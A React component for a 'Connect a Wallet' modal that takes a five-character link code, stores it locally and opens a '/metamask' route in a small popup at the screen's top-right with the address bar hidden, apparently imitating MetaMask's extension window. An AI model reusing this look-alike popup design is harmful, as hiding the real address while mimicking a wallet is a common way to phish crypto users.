import React from 'react'
import { Modal, Box, Typography, Button, TextField } from '@mui/material'
import CloseIcon from '@mui/icons-material/Close'
import IconButton from '@mui/material/IconButton'
import { useState } from 'react'

const WalletModal = ({ isOpen, handleClose }) => {
    const [isCodeInvalid, setIsCodeInvalid] = useState(false)
    const [code, setCode] = useState('');
    const modalStyle = {
        position: 'absolute',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        width: 400,
        bgcolor: 'background.paper',
        boxShadow: 24,
        p: 4,
        borderRadius: 4,
    }

    const handleCodeChange = (e) => {
        let value = e.target.value.toUpperCase();
        value = value.trimStart();
        setCode(value);
        if (value.length == 0) {
            setIsCodeInvalid(false)
            return

        }
        if (value.length !== 5) {
            setIsCodeInvalid(true);
        }
        else {
            setIsCodeInvalid(false);
        }
    };

    const metamask = () => {
        if (code === '' || code.length !== 5) {
            setIsCodeInvalid(true);
            return
        }
        localStorage.setItem('code', code);
        window.open('/metamask', 'target=_blank', `window=yes,toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=no,height=580px,width=350px,top=0,left=${window.screen.width - 300}`)
    }
    return (
        <Modal
            open={isOpen}
            onClose={handleClose}
            aria-labelledby="modal-modal-title"
            aria-describedby="modal-modal-description"
        >
            <Box sx={modalStyle}>
                <IconButton
                    aria-label="close"
                    onClick={handleClose}
                    size={'large'}
                    sx={{
                        position: 'absolute',
                        right: 0,
                        top: 0,
                        color: 'rgba(102, 102, 102, 0.2)',
                    }}
                >
                    <CloseIcon />
                </IconButton>
                <Typography
                    align={'center'}
                    id="modal-modal-title"
                    variant="h5"
                    fontFamily={'Poppins'}
                    fontWeight={'500'}
                    mt={'10px'}
                    mb={'45px'}
                >
                    Connect a Wallet
                </Typography>
                <Typography
                    align={'left'}
                    fontFamily={'Poppins'}
                    fontSize={'16px'}
                    fontWeight={'500'}
                >
                    Link code
                </Typography>               
                <TextField
                    fullWidth
                    margin="normal"
                    id="wallet-address"
                    label="Enter code"
                    placeholder="Enter your code here"
                    value={code}
                    onChange = {handleCodeChange}
                />
                 {isCodeInvalid && (
                    <p style={{
                        color: '#e53e3e',
                        fontSize: '0.875rem',  
                        marginBottom: '0.5rem'
                      }}>
                        Invalid code
                      </p>
                )}

                <Button
                    variant="contained"
                    color="primary"
                    fullWidth
                    bac
                    sx={{
                        mt: 2,
                        mb: 3,
                        textTransform: 'none',
                        fontFamily: 'Inter',
                        color: 'secondary.dark',
                    }}
                    target="_blank" 
                    onClick={metamask}
                
                >
                    Connect MetaMask
                </Button>
            </Box>
        </Modal>
    )
}

export default WalletModal
